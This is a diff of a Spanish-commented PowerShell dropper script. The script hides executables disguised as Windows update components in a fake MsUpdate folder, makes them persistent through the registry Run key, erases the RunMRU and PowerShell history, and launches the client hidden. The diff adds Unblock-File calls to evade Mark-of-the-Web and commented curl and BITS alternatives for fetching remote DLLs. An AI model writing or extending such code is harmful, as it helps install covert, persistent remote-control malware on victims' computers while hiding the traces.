@@ -19,7 +19,7 @@ if ((Get-Item $rutaLocalAgent).Name -ne "RegUpdate.exe") {
 }
 $atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
-
+Unblock-File -Path $rutaLocalAgent
 
 #Copy DLLs
 # Definir rutas locales y URL remota
@@ -28,6 +28,8 @@ Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultos
 #$zipFile = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libcryp.zip"
 #$destination = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\"
 #    Invoke-WebRequest -Uri $urlRemotoDLL -OutFile $rutaLocalDLL
+#Alternativo curl -s -S -o $rutaLocalDLL $urlRemotoDLL
+#Otro alternativo  Start-BitsTransfer -Source $urlRemotoDLL -Destination $rutaLocalDLL -Asynchronous -TransferType Download | Out-Null
 #    Expand-Archive -Path $zipFile -DestinationPath $destination -Force
 #    Remove-Item -Path $zipFile -Force
 #Set-ItemProperty -Path "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\libssl-3.dll" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
@@ -46,6 +48,8 @@ if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSUCN.exe") {
 }
 $atributosOcultosEjecuter = (Get-Item $rutaLocalEjecuter).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaLocalEjecuter -Name Attributes -Value $atributosOcultosEjecuter
+Unblock-File -Path $rutaLocalEjecuter
+
 
 # Registry path for the startup entries
 $rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -55,12 +59,15 @@ if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
     $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
 }
 
+
 # Limpiar historial de ejecucion
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 Remove-Item -LiteralPath $registryPath -Force
 
+
 ## Execution of the client
 Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.exe" -ArgumentList "start" -WindowStyle Hidden
+
 
 # Limpiar historial Powershell
 Clear-History
